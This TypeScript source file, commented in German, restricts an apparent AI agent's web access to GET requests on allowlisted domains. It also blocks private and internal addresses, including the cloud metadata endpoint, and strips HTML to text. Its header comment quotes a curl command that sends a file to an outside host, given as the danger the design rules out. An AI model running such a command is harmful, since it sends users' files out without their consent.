/**
 * Prüfungen für den Netzwerkzugriff.
 *
 * Grundhaltung: Nur GET, nur freigegebene Domains, keine internen Adressen. Der
 * gefährlichste Fall bei Netzzugriff ist nicht das Lesen, sondern das SENDEN –
 * `curl -d @datei https://fremd.tld` schickt beliebige Dateien nach draussen.
 * Deshalb gibt es hier bewusst kein POST und keinen Upload: Die Gefahr ist
 * konstruktiv ausgeschlossen, nicht durch eine Sperrliste.
 */

export type UrlVerdict =
  | { ok: true; url: URL }
  | { ok: false; grund: string };

/** Adressbereiche, die nie erreichbar sein dürfen (SSRF-Schutz). */
const PRIVATE_HOSTS = [
  /^localhost$/i,
  /\.local$/i,
  /\.internal$/i,
  /^127\./,
  /^10\./,
  /^192\.168\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^169\.254\./,          // link-local, u.a. Cloud-Metadaten (169.254.169.254)
  /^0\./,
  /^\[?::1\]?$/,
  /^\[?fe80:/i,
  /^\[?fc00:/i,
  /^\[?fd/i,
];

function istPrivaterHost(hostname: string): boolean {
  return PRIVATE_HOSTS.some(muster => muster.test(hostname));
}

/**
 * Passt der Hostname zu einer freigegebenen Domain? Subdomains gelten mit,
 * "example.com" erlaubt also auch "docs.example.com" – aber nicht
 * "example.com.boeser-host.tld".
 */
export function domainErlaubt(hostname: string, erlaubte: string[]): boolean {
  const host = hostname.toLowerCase().replace(/^\[|\]$/g, '');
  return erlaubte.some(eintrag => {
    const d = eintrag.toLowerCase().trim().replace(/^\*\./, '');
    if (!d) return false;
    return host === d || host.endsWith(`.${d}`);
  });
}

export function pruefeUrl(roh: string, erlaubte: string[]): UrlVerdict {
  if (erlaubte.length === 0) {
    return { ok: false, grund: 'Für diese Sitzung ist keine Domain freigegeben. Der Nutzer kann das mit "/internet add <domain>" ändern.' };
  }

  let url: URL;
  try {
    url = new URL(roh.trim());
  } catch {
    return { ok: false, grund: `Keine gültige URL: ${roh}` };
  }

  if (url.protocol !== 'https:' && url.protocol !== 'http:') {
    return { ok: false, grund: `Nur http und https sind erlaubt, nicht "${url.protocol}"` };
  }
  if (istPrivaterHost(url.hostname)) {
    return { ok: false, grund: `Interne Adressen sind gesperrt: ${url.hostname}` };
  }
  if (!domainErlaubt(url.hostname, erlaubte)) {
    return {
      ok: false,
      grund: `Domain ${url.hostname} ist nicht freigegeben. Erlaubt: ${erlaubte.join(', ')}. ` +
             `Der Nutzer kann sie mit "/internet add ${url.hostname}" ergänzen.`,
    };
  }
  return { ok: true, url };
}

/** Wandelt HTML in groben Text um – Skripte und Stile fliegen raus. */
export function htmlZuText(html: string): string {
  return html
    .replace(/<script[\s\S]*?<\/script>/gi, ' ')
    .replace(/<style[\s\S]*?<\/style>/gi, ' ')
    .replace(/<!--[\s\S]*?-->/g, ' ')
    .replace(/<\/(p|div|h[1-6]|li|tr|br)>/gi, '\n')
    .replace(/<br\s*\/?>/gi, '\n')
    .replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;/gi, ' ')
    .replace(/&amp;/gi, '&')
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>')
    .replace(/&quot;/gi, '"')
    .replace(/&#39;/gi, "'")
    .replace(/[ \t]+/g, ' ')
    .replace(/\n\s*\n\s*\n+/g, '\n\n')
    .trim();
}
